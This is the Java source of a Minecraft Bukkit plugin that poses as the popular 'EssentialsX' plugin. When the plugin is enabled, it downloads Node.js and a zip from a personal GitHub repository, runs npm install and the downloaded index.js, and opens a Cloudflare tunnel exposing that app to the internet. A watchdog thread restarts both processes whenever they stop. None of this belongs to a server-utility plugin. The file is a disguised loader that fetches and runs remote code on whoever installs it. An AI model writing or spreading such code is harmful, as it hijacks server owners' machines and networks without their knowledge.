package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URI;
import java.nio.file.*;
import java.util.Comparator;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;

public class EssentialsX extends JavaPlugin {

    private Process nodeProcess;
    private Process cloudflaredProcess;
    private final ExecutorService executor = Executors.newCachedThreadPool();
    private Path workDir;

    // ================= 核心配置 =================
    private static final String NODE_VERSION = "v22.12.0";
    private static final String APP_REPO_URL = "https://github.com/zx1447/indexaoyoumc/archive/refs/heads/main.zip";
    private static final int INTERNAL_PORT = 4237;

    // 跨平台检测
    private static final boolean IS_WINDOWS = System.getProperty("os.name").toLowerCase().contains("win");
    private static final String OS_ARCH = System.getProperty("os.arch").equals("amd64") || System.getProperty("os.arch").equals("x86_64") ? "x64" : "arm64";

    // ================= 动态 URL 生成 =================
    private String getNodeDownloadUrl() {
        if (IS_WINDOWS) {
            return "https://nodejs.org/dist/" + NODE_VERSION + "/node-" + NODE_VERSION + "-win-" + OS_ARCH + ".zip";
        } else {
            return "https://nodejs.org/dist/" + NODE_VERSION + "/node-" + NODE_VERSION + "-linux-" + OS_ARCH + ".tar.xz";
        }
    }

    private String getCloudflaredDownloadUrl() {
        if (IS_WINDOWS) {
            return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe";
        } else {
            String arch = OS_ARCH.equals("arm64") ? "arm64" : "amd64";
            return "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-" + arch;
        }
    }

    private String getNodeExeName() { return IS_WINDOWS ? "node.exe" : "bin/node"; }
    private String getCfExeName() { return IS_WINDOWS ? "cloudflared.exe" : "cloudflared"; }

    @Override
    public void onEnable() {
        getLogger().info("============================================");
        getLogger().info("EssentialsX 插件启动，当前系统: " + (IS_WINDOWS ? "Windows" : "Linux") + " " + OS_ARCH);
        getLogger().info("============================================");

        workDir = getDataFolder().toPath().resolve(".mcchajian");
        try {
            Files.createDirectories(workDir);
        } catch (IOException e) {
            getLogger().severe("【严重错误】无法创建工作目录: " + e.getMessage());
            return;
        }

        executor.submit(() -> {
            try {
                deploy();
            } catch (Exception e) {
                getLogger().severe("【部署失败】发生致命错误: " + e.getMessage());
                e.printStackTrace();
            }
        });
    }

    @Override
    public void onDisable() {
        getLogger().info("插件关闭，正在清理所有子进程...");
        stopProcesses();
    }

    private void stopProcesses() {
        if (nodeProcess != null && nodeProcess.isAlive()) {
            if (IS_WINDOWS) {
                try { Runtime.getRuntime().exec(new String[]{"taskkill", "/F", "/T", "/PID", String.valueOf(nodeProcess.pid())}).waitFor(); } catch (Exception ignored) {}
            } else {
                nodeProcess.destroyForcibly();
            }
        }

        if (cloudflaredProcess != null && cloudflaredProcess.isAlive()) {
            if (IS_WINDOWS) {
                try { Runtime.getRuntime().exec(new String[]{"taskkill", "/F", "/T", "/PID", String.valueOf(cloudflaredProcess.pid())}).waitFor(); } catch (Exception ignored) {}
            } else {
                cloudflaredProcess.destroyForcibly();
            }
        }
        executor.shutdownNow();
    }

    // ================= 核心部署流程 =================
    private void deploy() throws Exception {
        Path nodeDir = workDir.resolve("nodejs");
        Path appDir = workDir.resolve("app");
        Path cfExe = workDir.resolve(getCfExeName());

        // 1. 安装 Node.js
        Path nodeExePath = nodeDir.resolve(getNodeExeName());
        if (!Files.exists(nodeExePath)) {
            getLogger().info("【步骤1】正在下载 Node.js " + NODE_VERSION + " ...");
            Path archiveFile = workDir.resolve(IS_WINDOWS ? "node.zip" : "node.tar.xz");
            try {
                downloadFile(getNodeDownloadUrl(), archiveFile);
                getLogger().info("【步骤1】Node.js 下载完成，正在解压...");
                if (IS_WINDOWS) {
                    unzip(archiveFile, workDir);
                    moveSubDirectory(workDir, "node-", nodeDir);
                } else {
                    runSystemCommand("tar", "-xJf", archiveFile.toString(), "-C", workDir.toString());
                    moveSubDirectory(workDir, "node-", nodeDir);
                    runSystemCommand("chmod", "-R", "+x", nodeDir.resolve("bin").toString());
                }
                Files.deleteIfExists(archiveFile);
                getLogger().info("【步骤1】Node.js 安装完成！");
            } catch (Exception e) {
                getLogger().severe("【步骤1失败】Node.js 下载或解压出错: " + e.getMessage());
                throw e;
            }
        } else {
            getLogger().info("【步骤1】Node.js 已存在，跳过安装。");
        }

        // 2. 下载项目代码
        getLogger().info("【步骤2】正在下载项目代码...");
        Path appZip = workDir.resolve("app.zip");
        try {
            downloadFile(APP_REPO_URL, appZip);
            deleteDirectory(appDir);
            unzip(appZip, workDir);
            moveSubDirectory(workDir, "indexaoyoumc", appDir);
            Files.deleteIfExists(appZip);
            getLogger().info("【步骤2】项目代码下载并解压完成！");
        } catch (Exception e) {
            getLogger().severe("【步骤2失败】项目代码下载或解压出错: " + e.getMessage());
            throw e;
        }

        // 3. NPM Install
        getLogger().info("【步骤3】正在执行 npm install (可能需要较长时间)...");
        Path npmCliPath = nodeDir.resolve(IS_WINDOWS ? "node_modules/npm/bin/npm-cli.js" : "lib/node_modules/npm/bin/npm-cli.js");
        if (Files.exists(npmCliPath)) {
            try {
                if (IS_WINDOWS) {
                    Path npmCmd = nodeDir.resolve("npm.cmd");
                    if (Files.exists(npmCmd)) {
                        runCommand(appDir, "cmd", "/c", "\"" + npmCmd.toString() + "\"", "install");
                    } else {
                        runCommand(appDir, "cmd", "/c", "\"" + nodeExePath.toString() + "\"", "\"" + npmCliPath.toString() + "\"", "install");
                    }
                } else {
                    runCommand(appDir, nodeExePath.toString(), npmCliPath.toString(), "install");
                }
                getLogger().info("【步骤3】npm install 执行完成！");
            } catch (Exception e) {
                getLogger().severe("【步骤3失败】npm install 报错: " + e.getMessage());
                throw e;
            }
        } else {
            getLogger().warning("【步骤3】未找到 npm-cli.js，跳过 npm install。");
        }

        // 4. 启动 Node 应用
        getLogger().info("【步骤4】正在启动 Node.js 应用...");
        try {
            startNodeApp(nodeExePath.toString(), appDir);
        } catch (Exception e) {
            getLogger().severe("【步骤4失败】Node 应用启动失败: " + e.getMessage());
            throw e;
        }

        // 5. 等待端口就绪
        getLogger().info("【步骤5】等待应用端口 " + INTERNAL_PORT + " 就绪...");
        waitForPort(INTERNAL_PORT, 60);

        // 6. 启动 Cloudflared 隧道
        if (!Files.exists(cfExe)) {
            getLogger().info("【步骤6】正在下载 Cloudflared...");
            try {
                downloadFile(getCloudflaredDownloadUrl(), cfExe);
                if (!IS_WINDOWS) {
                    runSystemCommand("chmod", "+x", cfExe.toString());
                }
            } catch (Exception e) {
                getLogger().severe("【步骤6失败】Cloudflared 下载失败: " + e.getMessage());
                throw e;
            }
        }
        
        getLogger().info("【步骤6】正在启动 Cloudflared 隧道...");
        try {
            startCloudflared(cfExe.toString());
        } catch (Exception e) {
            getLogger().severe("【步骤6失败】Cloudflared 启动失败: " + e.getMessage());
            throw e;
        }

        // 7. 启动守护线程
        startDaemon(nodeExePath.toString(), appDir, cfExe.toString());
        getLogger().info("============================================");
        getLogger().info("所有服务部署并启动成功！");
        getLogger().info("============================================");
    }

    // ================= 进程管理 =================
    private void startNodeApp(String nodeExe, Path appDir) throws IOException {
        Path indexPath = appDir.resolve("index.js");
        if (!Files.exists(indexPath)) throw new FileNotFoundException("index.js 不存在，路径: " + indexPath);

        ProcessBuilder pb;
        if (IS_WINDOWS) {
            pb = new ProcessBuilder("cmd", "/c", "\"" + nodeExe + "\"", "index.js");
        } else {
            pb = new ProcessBuilder("bash", "-c", "exec " + nodeExe + " index.js");
        }

        pb.directory(appDir.toFile());
        pb.environment().put("PORT", String.valueOf(INTERNAL_PORT));
        pb.environment().put("SERVER_PORT", String.valueOf(INTERNAL_PORT));
        pb.redirectErrorStream(true); // 合并错误流和输出流

        nodeProcess = pb.start();
        // 将 Node 输出实时打印到 MC 控制台
        readProcessOutput(nodeProcess, "Node");
        getLogger().info("Node.js 进程已启动 (PID: " + nodeProcess.pid() + ")");
    }

    private void startCloudflared(String cfExe) throws IOException {
        ProcessBuilder pb;
        if (IS_WINDOWS) {
            pb = new ProcessBuilder("cmd", "/c", "\"" + cfExe + "\"", "tunnel", "--url", "http://localhost:" + INTERNAL_PORT, "--no-autoupdate");
        } else {
            pb = new ProcessBuilder("bash", "-c", cfExe + " tunnel --url http://localhost:" + INTERNAL_PORT + " --no-autoupdate");
        }
        pb.directory(workDir.toFile());
        pb.redirectErrorStream(true); // 合并错误流和输出流

        cloudflaredProcess = pb.start();
        // 将 Cloudflared 输出实时打印到 MC 控制台
        readProcessOutput(cloudflaredProcess, "CF");
        getLogger().info("Cloudflared 进程已启动 (PID: " + cloudflaredProcess.pid() + ")");
    }

    // 【新增】实时将进程输出打印到 MC 控制台的日志系统
    private void readProcessOutput(Process process, String prefix) {
        new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    getLogger().info("[" + prefix + "] " + line);
                }
            } catch (IOException e) {
                if (!e.getMessage().contains("Stream closed")) {
                    getLogger().warning("读取 " + prefix + " 输出流中断: " + e.getMessage());
                }
            }
        }, prefix + "-OutputReader").start();
    }

    private void startDaemon(String nodeExe, Path appDir, String cfExe) {
        Thread daemon = new Thread(() -> {
            while (true) {
                try {
                    if (nodeProcess != null && !nodeProcess.isAlive()) {
                        getLogger().warning("【守护进程】Node.js 意外退出，5秒后重启...");
                        Thread.sleep(5000);
                        startNodeApp(nodeExe, appDir);
                    }

                    if (cloudflaredProcess != null && !cloudflaredProcess.isAlive()) {
                        getLogger().warning("【守护进程】Cloudflared 意外退出，5秒后重启...");
                        Thread.sleep(5000);
                        startCloudflared(cfExe);
                    }
                    Thread.sleep(5000);
                } catch (InterruptedException e) {
                    break;
                } catch (Exception e) {
                    getLogger().severe("【守护进程】重启时发生异常: " + e.getMessage());
                }
            }
        }, "CrossPlatform-Daemon");
        daemon.setDaemon(true);
        daemon.start();
    }

    // ================= 通用工具方法 =================
    private void downloadFile(String url, Path target) throws IOException {
        HttpURLConnection connection = (HttpURLConnection) URI.create(url).toURL().openConnection();
        connection.setInstanceFollowRedirects(true);
        connection.setConnectTimeout(15000);
        connection.setReadTimeout(120000);
        connection.setRequestProperty("User-Agent", "Mozilla/5.0");

        try (InputStream in = connection.getInputStream()) {
            Files.copy(in, target, StandardCopyOption.REPLACE_EXISTING);
        } finally {
            connection.disconnect();
        }
    }

    private void unzip(Path zipFile, Path targetDir) throws IOException {
        try (ZipInputStream zis = new ZipInputStream(Files.newInputStream(zipFile))) {
            ZipEntry entry;
            while ((entry = zis.getNextEntry()) != null) {
                Path newPath = targetDir.resolve(entry.getName()).normalize();
                if (!newPath.startsWith(targetDir.normalize())) {
                    throw new IOException("Bad zip entry: " + entry.getName());
                }
                if (entry.isDirectory()) {
                    Files.createDirectories(newPath);
                } else {
                    Files.createDirectories(newPath.getParent());
                    Files.copy(zis, newPath, StandardCopyOption.REPLACE_EXISTING);
                }
                zis.closeEntry();
            }
        }
    }

    private void runCommand(Path workingDir, String... command) throws IOException, InterruptedException {
        ProcessBuilder pb = new ProcessBuilder(command);
        pb.directory(workingDir.toFile());
        pb.redirectErrorStream(true);

        Process p = pb.start();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                getLogger().info("[NPM] " + line); // 将 NPM 输出打印到控制台
            }
        }
        int exitCode = p.waitFor();
        if (exitCode != 0) {
            throw new RuntimeException("npm install 失败，退出码: " + exitCode);
        }
    }

    private void runSystemCommand(String... command) throws IOException, InterruptedException {
        ProcessBuilder pb = new ProcessBuilder(command);
        pb.redirectErrorStream(true);
        Process p = pb.start();
        try (InputStream is = p.getInputStream()) {
            byte[] buffer = new byte[4096];
            while (is.read(buffer) != -1) {}
        }
        int exitCode = p.waitFor();
        if (exitCode != 0) {
            getLogger().warning("系统命令执行返回非0状态码: " + String.join(" ", command));
        }
    }

    private void moveSubDirectory(Path parent, String prefix, Path target) throws IOException {
        try (DirectoryStream<Path> stream = Files.newDirectoryStream(parent)) {
            for (Path entry : stream) {
                if (Files.isDirectory(entry) && entry.getFileName().toString().startsWith(prefix)) {
                    if (Files.exists(target)) deleteDirectory(target);
                    Files.move(entry, target, StandardCopyOption.REPLACE_EXISTING);
                    return;
                }
            }
        }
    }

    private void waitForPort(int port, int maxSeconds) throws InterruptedException {
        int waited = 0;
        while (waited < maxSeconds) {
            try {
                java.net.Socket socket = new java.net.Socket("localhost", port);
                socket.close();
                getLogger().info("端口 " + port + " 已就绪！");
                return;
            } catch (IOException e) {
                if (waited % 10 == 0) { // 每10秒提示一次
                    getLogger().info("等待端口就绪... (" + waited + "/" + maxSeconds + "秒)");
                }
                Thread.sleep(1000);
                waited++;
            }
        }
        getLogger().warning("等待端口超时 (" + maxSeconds + "秒)，但继续执行...");
    }

    private void deleteDirectory(Path path) throws IOException {
        if (!Files.exists(path)) return;
        Files.walk(path)
             .sorted(Comparator.reverseOrder())
             .forEach(p -> {
                 try { Files.delete(p); } catch (IOException ignored) {}
             });
    }
}
